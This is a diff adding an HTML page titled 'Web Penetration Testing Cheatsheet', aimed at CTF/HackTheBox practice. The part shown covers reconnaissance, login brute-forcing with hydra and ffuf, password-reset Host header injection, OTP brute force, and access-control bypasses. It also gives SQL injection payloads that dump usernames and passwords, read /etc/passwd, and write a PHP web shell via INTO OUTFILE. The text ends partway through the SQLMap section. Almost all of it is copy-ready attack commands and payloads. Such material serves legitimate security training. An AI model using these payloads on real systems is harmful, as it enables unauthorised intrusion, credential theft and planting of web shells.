@@ -1,0 +1,2660 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    /* ── MD Cheatsheet Styles ── */
+    .md-h1 {
+      font-family: var(--mono);
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--text);
+      margin: 0 0 6px;
+    }
+
+    .md-h3 {
+      font-family: var(--mono);
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--accent);
+      margin: 24px 0 10px;
+      letter-spacing: .03em;
+    }
+
+    .md-h4 {
+      font-family: var(--mono);
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--orange);
+      margin: 18px 0 8px;
+    }
+
+    .md-p {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.8;
+      margin: 10px 0;
+    }
+
+    .md-hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 32px 0;
+    }
+
+    .md-ul,
+    .md-ol {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.8;
+      padding-left: 20px;
+      margin: 8px 0;
+    }
+
+    .md-ul li,
+    .md-ol li {
+      margin: 2px 0;
+    }
+
+    .md-ol a,
+    .md-ul a {
+      color: #c4d4d4;
+      text-decoration: none;
+    }
+
+    .md-ol a:hover,
+    .md-ul a:hover {
+      text-decoration: underline;
+    }
+
+    .md-blockquote {
+      border-left: 3px solid var(--green);
+      padding: 8px 14px;
+      background: rgba(57, 211, 83, .05);
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      margin: 10px 0;
+      border-radius: 0 6px 6px 0;
+    }
+
+    .inline-code {
+      background: var(--surface2);
+      color: var(--accent);
+      padding: 1px 6px;
+      border-radius: 4px;
+      font-family: var(--mono);
+      font-size: 11px;
+      border: 1px solid var(--border);
+    }
+
+    .md-table-wrap {
+      overflow-x: auto;
+      margin: 14px 0;
+    }
+
+    .md-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: var(--mono);
+      font-size: 11px;
+    }
+
+    .md-table th {
+      background: var(--surface);
+      color: var(--text);
+      padding: 8px 12px;
+      border: 1px solid var(--border);
+      text-align: left;
+    }
+
+    .md-table td {
+      color: var(--muted);
+      padding: 7px 12px;
+      border: 1px solid var(--border);
+    }
+
+    .md-table tr:hover td {
+      background: var(--bg3);
+      color: var(--text);
+    }
+
+    .cm {
+      color: #3d4450;
+      font-style: italic;
+    }
+
+    .page-header {
+      margin-bottom: 32px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .page-header-sub {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      margin-top: 6px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="page-content">
+
+    <div class="page-header">
+      <h1 class="md-h1">Web Penetration Testing Cheatsheet</h1>
+      <div class="page-header-sub">by J0stif &nbsp;·&nbsp; OWASP Top 10 + CTF/HTB Coverage</div>
+    </div>
+
+    <hr class="md-hr">
+    <div class="sec-hdr" id="table-of-contents" style="margin-top:36px"><span class="sec-title">📋 TABLE OF
+        CONTENTS</span><span class="sec-line"></span></div>
+    <ol class="md-ol">
+      <li><a href="#environment-setup-tools">Environment Setup & Tools</a></li>
+      <li><a href="#phase-1-reconnaissance-mapping">Phase 1 — Reconnaissance & Mapping</a></li>
+      <li><a href="#phase-2-authentication-attacks">Phase 2 — Authentication Attacks</a></li>
+      <li><a href="#a01-broken-access-control">A01 — Broken Access Control</a></li>
+      <li><a href="#a02-cryptographic-failures">A02 — Cryptographic Failures</a></li>
+      <li><a href="#a03-sql-injection">A03 — SQL Injection</a></li>
+      <li><a href="#a04-nosql-other-injection">A04 — NoSQL / Other Injection</a></li>
+      <li><a href="#a05-security-misconfiguration">A05 — Security Misconfiguration</a></li>
+      <li><a href="#a06-xss-cross-site-scripting">A06 — XSS (Cross-Site Scripting)</a></li>
+      <li><a href="#a07-ssrf-server-side-request-forgery">A07 — SSRF (Server-Side Request Forgery)</a></li>
+      <li><a href="#a08-ssti-server-side-template-injection">A08 — SSTI (Server-Side Template Injection)</a></li>
+      <li><a href="#a09-xxe-xml-external-entity">A09 — XXE (XML External Entity)</a></li>
+      <li><a href="#a10-file-upload-attacks">A10 — File Upload Attacks</a></li>
+      <li><a href="#a11-lfi-path-traversal-rfi">A11 — LFI / Path Traversal / RFI</a></li>
+      <li><a href="#a12-command-injection">A12 — Command Injection</a></li>
+      <li><a href="#a13-insecure-deserialization">A13 — Insecure Deserialization</a></li>
+      <li><a href="#a14-jwt-attacks">A14 — JWT Attacks</a></li>
+      <li><a href="#a15-oauth-oidc-attacks">A15 — OAuth & OIDC Attacks</a></li>
+      <li><a href="#a16-csrf">A16 — CSRF</a></li>
+      <li><a href="#a17-websockets-attacks">A17 — WebSockets Attacks</a></li>
+      <li><a href="#a18-graphql-attacks">A18 — GraphQL Attacks</a></li>
+      <li><a href="#a19-api-security-testing">A19 — API Security Testing</a></li>
+      <li><a href="#a20-race-conditions">A20 — Race Conditions</a></li>
+      <li><a href="#a21-http-request-smuggling">A21 — HTTP Request Smuggling</a></li>
+      <li><a href="#a22-cors-misconfigurations">A22 — CORS Misconfigurations</a></li>
+      <li><a href="#a23-prototype-pollution">A23 — Prototype Pollution</a></li>
+      <li><a href="#a24-ldap-injection">A24 — LDAP Injection</a></li>
+      <li><a href="#a25-web-cache-poisoning">A25 — Web Cache Poisoning</a></li>
+      <li><a href="#post-exploitation-web-shell-pivot">Post-Exploitation — Web Shell & Pivot</a></li>
+      <li><a href="#tools-quick-reference">Tools Quick Reference</a></li>
+    </ol>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="environment-setup-tools" style="margin-top:36px"><span class="sec-title">🛠️ Environment
+        Setup & Tools</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Variables</span>
+        export URL="http://target.htb"
+        export IP=10.10.11.XXX
+        export LHOST=10.10.14.XXX
+        export LPORT=4444
+
+        <span class="cm"># /etc/hosts</span>
+        echo "$IP target.htb" &gt;&gt; /etc/hosts
+
+        <span class="cm"># Burp Suite — proxy everything</span>
+        <span class="cm"># Browser: 127.0.0.1:8080</span>
+        <span class="cm"># CA cert: http://burpsuite/</span>
+
+        <span class="cm"># Essential tools check</span>
+        which ffuf gobuster feroxbuster sqlmap nikto wfuzz curl httpx
+
+        <span class="cm"># Install missing</span>
+        pip3 install sqlmap
+        apt install ffuf gobuster feroxbuster nikto wfuzz
+      </div>
+    </div>
+    <h3 class="md-h3" id="burp-suite-essentials">Burp Suite Essentials</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Intercept toggle: Proxy → Intercept → On/Off</span>
+        <span class="cm"># Repeater: Ctrl+R (send request to Repeater)</span>
+        <span class="cm"># Intruder: Ctrl+I (send to Intruder for fuzzing)</span>
+        <span class="cm"># Scanner: Right-click → Scan</span>
+        <span class="cm"># Decoder: Ctrl+Shift+D</span>
+        <span class="cm"># Comparer: Ctrl+Shift+C</span>
+        <span class="cm"># Search in history: Proxy → HTTP History → Filter</span>
+
+        <span class="cm"># Must-have extensions (BApp Store):</span>
+        <span class="cm"># - Param Miner (hidden params discovery)</span>
+        <span class="cm"># - JWT Editor (JWT attacks)</span>
+        <span class="cm"># - Turbo Intruder (race conditions, fast fuzzing)</span>
+        <span class="cm"># - SQLiPy (SQLMap integration)</span>
+        <span class="cm"># - Active Scan++ (better scanner)</span>
+        <span class="cm"># - Retire.js (outdated JS libraries)</span>
+        <span class="cm"># - Upload Scanner (file upload attacks)</span>
+        <span class="cm"># - Hackvertor (encoding chains)</span>
+        <span class="cm"># - Autorize (access control testing)</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-1-reconnaissance-mapping" style="margin-top:36px"><span class="sec-title">Phase 1 —
+        Reconnaissance & Mapping</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="11-technology-fingerprinting">1.1 Technology Fingerprinting</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Wappalyzer (browser extension) — auto-detect stack</span>
+        <span class="cm"># Or manual:</span>
+        curl -I $URL <span class="cm"># headers: Server, X-Powered-By, Set-Cookie</span>
+        curl -s $URL | grep -i "generator\|powered\|framework\|version"
+
+        <span class="cm"># WhatWeb</span>
+        whatweb $URL
+        whatweb -v $URL
+        whatweb -a 4 $URL <span class="cm"># aggressive</span>
+
+        <span class="cm"># httpx</span>
+        echo $URL | httpx -tech-detect -title -status-code -content-length
+
+        <span class="cm"># Nikto (quick vuln scan)</span>
+        nikto -h $URL
+        nikto -h $URL -ssl <span class="cm"># HTTPS</span>
+
+        <span class="cm"># Check robots.txt and sitemap</span>
+        curl $URL/robots.txt
+        curl $URL/sitemap.xml
+        curl $URL/sitemap_index.xml
+      </div>
+    </div>
+    <h3 class="md-h3" id="12-directory-file-fuzzing">1.2 Directory & File Fuzzing</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># ffuf — best overall</span>
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e
+        .php,.html,.txt,.bak,.old,.zip,.tar.gz -t 100
+        ffuf -u $URL/FUZZ -w wordlist.txt -mc 200,201,301,302,403 -fc 404 -fs 0
+
+        <span class="cm"># Filter by size / words / lines</span>
+        ffuf -u $URL/FUZZ -w wordlist.txt -fs 1234 <span class="cm"># filter size</span>
+        ffuf -u $URL/FUZZ -w wordlist.txt -fw 10 <span class="cm"># filter word count</span>
+        ffuf -u $URL/FUZZ -w wordlist.txt -fl 50 <span class="cm"># filter line count</span>
+        ffuf -u $URL/FUZZ -w wordlist.txt -fc 302 <span class="cm"># filter redirect</span>
+
+        <span class="cm"># Feroxbuster (recursive auto)</span>
+        feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak
+        -t 100
+        feroxbuster -u $URL -w wordlist.txt --depth 3 -x php,aspx,html
+
+        <span class="cm"># Gobuster</span>
+        gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html -t
+        50
+        gobuster dir -u $URL -w wordlist.txt -b 404,403 <span class="cm"># blacklist status codes</span>
+
+        <span class="cm"># IIS-specific</span>
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/all.txt
+
+        <span class="cm"># Backup files</span>
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/backup-filenames.txt
+      </div>
+    </div>
+    <h3 class="md-h3" id="13-subdomain-vhost-fuzzing">1.3 Subdomain & Vhost Fuzzing</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Subdomain enumeration</span>
+        ffuf -u http://FUZZ.target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100
+        gobuster dns -d target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50
+        amass enum -d target.htb
+
+        <span class="cm"># Vhost fuzzing (different Host header, same IP)</span>
+        ffuf -u $URL -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+        -fs [baseline_size] -t 100
+        gobuster vhost -u http://target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+        --append-domain
+
+        <span class="cm"># After finding vhosts, add to /etc/hosts and enumerate each</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="14-parameter-discovery">1.4 Parameter Discovery</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Arjun — hidden parameter discovery</span>
+        arjun -u $URL/page.php
+        arjun -u $URL/page.php -m POST
+        arjun -u $URL/api/endpoint -m JSON
+        arjun -u $URL -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+        <span class="cm"># ffuf — parameter fuzzing</span>
+        ffuf -u "$URL/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
+        ffuf -u "$URL/page.php?id=FUZZ" -w /usr/share/seclists/Fuzzing/Integers.fuzz.txt
+
+        <span class="cm"># Param Miner (Burp extension) — auto finds hidden params</span>
+
+        <span class="cm"># JS file analysis</span>
+        <span class="cm"># Find all JS files</span>
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .js
+        <span class="cm"># Extract endpoints from JS</span>
+        curl -s $URL/app.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"
+        curl -s $URL/app.js | grep -Eo '\"\/[a-zA-Z0-9_/.-]*\"' | tr -d '"'
+
+        <span class="cm"># LinkFinder</span>
+        python3 linkfinder.py -i $URL -d -o cli
+      </div>
+    </div>
+    <h3 class="md-h3" id="15-source-code-review">1.5 Source Code Review</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># View page source</span>
+        curl -s $URL | grep -i "comment\|todo\|fixme\|hack\|password\|key\|secret\|api"
+        curl -s $URL | grep -i "&lt;!--" <span class="cm"># HTML comments</span>
+
+        <span class="cm"># .git exposure</span>
+        curl $URL/.git/HEAD
+        git-dumper $URL/.git ./dumped_repo
+        <span class="cm"># Then: git log, git diff, grep -r password</span>
+
+        <span class="cm"># Other exposed files</span>
+        curl $URL/.env
+        curl $URL/.env.local
+        curl $URL/.env.backup
+        curl $URL/config.php
+        curl $URL/config.js
+        curl $URL/wp-config.php
+        curl $URL/settings.py
+        curl $URL/database.yml
+        curl $URL/appsettings.json
+        curl $URL/.htaccess
+        curl $URL/web.config
+        curl $URL/phpinfo.php
+        curl $URL/info.php
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-2-authentication-attacks" style="margin-top:36px"><span class="sec-title">Phase 2 —
+        Authentication Attacks</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="21-brute-force-credential-stuffing">2.1 Brute Force & Credential Stuffing</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Hydra — HTTP form POST</span>
+        hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form
+        "/login:username=^USER^&amp;password=^PASS^:Invalid credentials" -V
+        hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP http-post-form
+        "/login:user=^USER^&amp;pass=^PASS^:F=Login failed"
+
+        <span class="cm"># Hydra — HTTP GET form</span>
+        hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get-form
+        "/login:user=^USER^&amp;pass=^PASS^:F=incorrect"
+
+        <span class="cm"># Hydra — HTTP basic auth</span>
+        hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get /admin/
+
+        <span class="cm"># ffuf — login brute force</span>
+        ffuf -u $URL/login -X POST -d "username=admin&amp;password=FUZZ" -w /usr/share/wordlists/rockyou.txt -fc 302 -t
+        50
+
+        <span class="cm"># Username enumeration (different response size/time)</span>
+        ffuf -u $URL/login -X POST -d "username=FUZZ&amp;password=wrongpass" -w
+        /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -fs [valid_size]
+
+        <span class="cm"># Medusa</span>
+        medusa -h $IP -U users.txt -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login -m
+        FORM:username=&amp;password= -m DENY:Invalid
+
+        <span class="cm"># Default credentials to always try</span>
+        admin:admin
+        admin:password
+        admin:admin123
+        admin:123456
+        administrator:administrator
+        root:root
+        guest:guest
+        test:test
+      </div>
+    </div>
+    <h3 class="md-h3" id="22-password-reset-flaws">2.2 Password Reset Flaws</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Token predictability — collect multiple tokens, check entropy</span>
+        <span class="cm"># Check if token is timestamp-based, sequential, or MD5 of email</span>
+
+        <span class="cm"># Host header injection in password reset</span>
+        <span class="cm"># Change Host header to your server, intercept reset link</span>
+        POST /forgot-password
+        Host: $LHOST ← inject your server
+        email=victim@target.com
+        <span class="cm"># If vulnerable, reset link will point to your server</span>
+
+        <span class="cm"># Parameter pollution</span>
+        POST /forgot-password
+        email=victim@target.com&amp;email=attacker@attacker.com
+
+        <span class="cm"># Token reuse — is token invalidated after use?</span>
+        <span class="cm"># Token scope — does token for one user work for another?</span>
+
+        <span class="cm"># Response manipulation — change "false" to "true" in OTP verification response</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="23-mfa-bypass">2.3 MFA Bypass</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Skip MFA step entirely — after first factor, directly access protected
+          resource</span>
+
+        <span class="cm"># Response manipulation</span>
+        POST /verify-otp
+        {"otp": "000000"}
+        <span class="cm"># If response: {"valid": false} → change to {"valid": true} in Burp → forward</span>
+
+        <span class="cm"># Code reuse — try previously used OTP</span>
+
+        <span class="cm"># Brute force OTP (4-6 digits)</span>
+        ffuf -u $URL/verify -X POST -d '{"otp":"FUZZ"}' -H "Content-Type: application/json" -w
+        /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
+
+        <span class="cm"># Backup code abuse — try common backup codes: 00000000, 12345678</span>
+
+        <span class="cm"># Account takeover via MFA — if email is changeable before MFA step</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a01-broken-access-control" style="margin-top:36px"><span class="sec-title">A01 — Broken
+        Access Control</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="idor-insecure-direct-object-reference">IDOR (Insecure Direct Object Reference)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Change ID in URL / body / header</span>
+        GET /api/user/1337/profile → try /api/user/1/profile (admin)
+        GET /api/orders/1337 → try /api/orders/1
+
+        <span class="cm"># GUIDs — not random? Predict or brute force</span>
+        GET /api/user/550e8400-e29b-41d4-a716-446655440000
+
+        <span class="cm"># Parameter pollution</span>
+        GET /api/profile?user_id=attacker_id&amp;user_id=victim_id
+
+        <span class="cm"># JSON body IDOR</span>
+        {"user_id": 1337} → change to {"user_id": 1}
+
+        <span class="cm"># Hidden parameters (X-User-Id, X-Account-Id headers)</span>
+        X-User-ID: 1
+
+        <span class="cm"># Mass assignment / auto-binding</span>
+        POST /api/user/update
+        {"username":"attacker","is_admin":true,"role":"admin"}
+
+        <span class="cm"># Blind IDOR — no visible data, but behavior changes (different response time, different
+          error)</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="privilege-escalation">Privilege Escalation</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Horizontal → access other user's resources</span>
+        <span class="cm"># Vertical → access higher privilege functions</span>
+
+        <span class="cm"># Function-level access control</span>
+        GET /admin/users → 403
+        GET /ADMIN/users → 200? (case)
+        GET /admin/users/ → 200? (trailing slash)
+        GET /admin%2fusers → 200? (URL encoding)
+        GET /./admin/./users → 200? (path traversal)
+        GET /api/v1/admin/users → 403
+        GET /api/v2/admin/users → 200? (old version)
+        GET /api/admin/users → 403
+        GET /api/admin-users → 200? (different endpoint)
+
+        <span class="cm"># HTTP method override</span>
+        POST /admin/delete
+        X-HTTP-Method-Override: GET
+
+        <span class="cm"># Referer-based access control</span>
+        Referer: http://target.htb/admin
+
+        <span class="cm"># Forced browsing — enumerate admin paths</span>
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-admin-filenames.txt
+      </div>
+    </div>
+    <h3 class="md-h3" id="jwt-role-tampering-see-also-a14">JWT Role Tampering (see also A14)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Decode JWT payload</span>
+        echo "PAYLOAD_BASE64" | base64 -d
+        <span class="cm"># Change "role":"user" to "role":"admin"</span>
+        <span class="cm"># Re-encode and sign with None algorithm or known secret</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a02-cryptographic-failures" style="margin-top:36px"><span class="sec-title">A02 —
+        Cryptographic Failures</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="sensitive-data-exposure">Sensitive Data Exposure</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Check HTTPS enforcement</span>
+        curl -I http://$URL <span class="cm"># should redirect to HTTPS</span>
+        <span class="cm"># Check HSTS header</span>
+        curl -I https://$URL | grep Strict-Transport
+
+        <span class="cm"># SSL/TLS issues</span>
+        testssl.sh $URL
+        sslscan $URL
+        nmap --script ssl-enum-ciphers -p 443 $IP
+
+        <span class="cm"># Weak ciphers, expired certs, self-signed certs</span>
+        openssl s_client -connect $IP:443
+
+        <span class="cm"># Check for sensitive data in:</span>
+        <span class="cm"># Response headers (debug info, stack traces)</span>
+        <span class="cm"># HTML comments</span>
+        <span class="cm"># JavaScript files (API keys, passwords)</span>
+        <span class="cm"># Error messages (database errors, file paths)</span>
+        <span class="cm"># Logs accessible via LFI</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="insecure-cryptography">Insecure Cryptography</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Identify hash types</span>
+        hash-identifier &lt;hash&gt;
+        hashid &lt;hash&gt;
+
+        <span class="cm"># Crack weak hashes</span>
+        hashcat -m 0 md5.txt rockyou.txt <span class="cm"># MD5</span>
+        hashcat -m 100 sha1.txt rockyou.txt <span class="cm"># SHA1</span>
+        john hash.txt --wordlist=rockyou.txt
+
+        <span class="cm"># ECB mode block manipulation</span>
+        <span class="cm"># If encrypted data is in blocks of 16 bytes and you can control input:</span>
+        <span class="cm"># Insert padding to align sensitive data at block boundary</span>
+        <span class="cm"># Swap cipher blocks to modify meaning</span>
+
+        <span class="cm"># Padding oracle attack</span>
+        python3 padbuster.py $URL/decrypt?data=CIPHERTEXT 8 -encoding 0
+
+        <span class="cm"># CBC bit-flipping</span>
+        <span class="cm"># Flip bits in previous cipher block to modify next plaintext block</span>
+        <span class="cm"># Position: byte to flip = target_byte XOR known_plaintext XOR desired_plaintext</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a03-sql-injection" style="margin-top:36px"><span class="sec-title">A03 — SQL
+        Injection</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Error-based detection — inject these and look for DB errors</span>
+        '
+        ''
+        `
+        ')
+        "))
+        ' OR '1'='1
+        ' OR 1=1--
+        " OR 1=1--
+        ' OR 'x'='x
+        1' ORDER BY 1--
+        1' ORDER BY 100-- (error = number of columns exceeded)
+        1 WAITFOR DELAY '0:0:5'-- (MSSQL time-based)
+        1' AND SLEEP(5)-- (MySQL time-based)
+        1' AND 1=1-- (boolean true)
+        1' AND 1=2-- (boolean false — different response)</div>
+    </div>
+    <h3 class="md-h3" id="manual-exploitation">Manual Exploitation</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Step 1: Find number of columns</span>
+        ' ORDER BY 1--
+        ' ORDER BY 2--
+        ' ORDER BY 3-- <span class="cm"># error here = 2 columns</span>
+
+        <span class="cm"># Step 2: Find visible columns (UNION)</span>
+        ' UNION SELECT NULL,NULL--
+        ' UNION SELECT 'a',NULL--
+        ' UNION SELECT NULL,'a'--
+
+        <span class="cm"># Step 3: Extract DB info</span>
+        ' UNION SELECT version(),NULL-- <span class="cm"># MySQL</span>
+        ' UNION SELECT @@version,NULL-- <span class="cm"># MSSQL</span>
+        ' UNION SELECT banner,NULL FROM v$version-- <span class="cm"># Oracle</span>
+
+        <span class="cm"># Extract database name</span>
+        ' UNION SELECT database(),NULL-- <span class="cm"># MySQL</span>
+        ' UNION SELECT DB_NAME(),NULL-- <span class="cm"># MSSQL</span>
+
+        <span class="cm"># Extract tables</span>
+        ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+        <span class="cm"># MSSQL:</span>
+        ' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+        <span class="cm"># Extract columns</span>
+        ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+        <span class="cm"># Extract data</span>
+        ' UNION SELECT username,password FROM users--
+        ' UNION SELECT username||':'||password,NULL FROM users-- <span class="cm"># concat (Oracle/PostgreSQL)</span>
+        ' UNION SELECT CONCAT(username,':',password),NULL FROM users-- <span class="cm"># MySQL</span>
+
+        <span class="cm"># Read files (MySQL)</span>
+        ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+
+        <span class="cm"># Write files (MySQL — if FILE priv + writable path)</span>
+        ' UNION SELECT '&lt;?php system($_GET[\"cmd\"]); ?&gt;',NULL INTO OUTFILE '/var/www/html/shell.php'--
+      </div>
+    </div>
+    <h3 class="md-h3" id="sqlmap">SQLMap</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Basic</span>
+        sqlmap -u "$URL/page?id=1" --dbs
+        sqlmap -u "$URL/page?id=1" -D dbname --tables
+        sqlmap -u "$URL/page?id=1" -D dbname -T users --dump
+
+        <span class="cm"># POST request</span>
+        sqlmap -u "$URL/login" --data="username=admin&amp;password=test" --dbs
+
+        <span class="cm"># From Burp request file</span>
+        sqlmap -r request.txt --dbs
+        sqlmap -r request.txt -D dbname -T users --dump
+
+        <span class="cm"># With cookies</span>
+        sqlmap -u "$URL/page" --cookie="PHPSESSID=abc123" --dbs
+
+        <span class="cm"># JSON body</span>
+        sqlmap -u "$URL/api/search" --data='{"id":1}' --headers="Content-Type: application/json" --dbs
+
+        <span class="cm"># Level / Risk (higher = more tests, more intrusive)</span>
+        sqlmap -r request.txt --level=5 --risk=3 --dbs
+
+        <span class="cm"># Specify DBMS</span>
+        sqlmap -r request.txt --dbms=mysql --dbs
+        sqlmap -r request.txt --dbms=mssql --dbs
+        sqlmap -r request.txt --dbms=postgresql --dbs
+
+        <span class="cm"># Techniques</span>
+        sqlmap -r request.txt --technique=BEUSTQ <span class="cm"># all techniques</span>
+        sqlmap -r request.txt --technique=T <span class="cm"># time-based only (blind)</span>
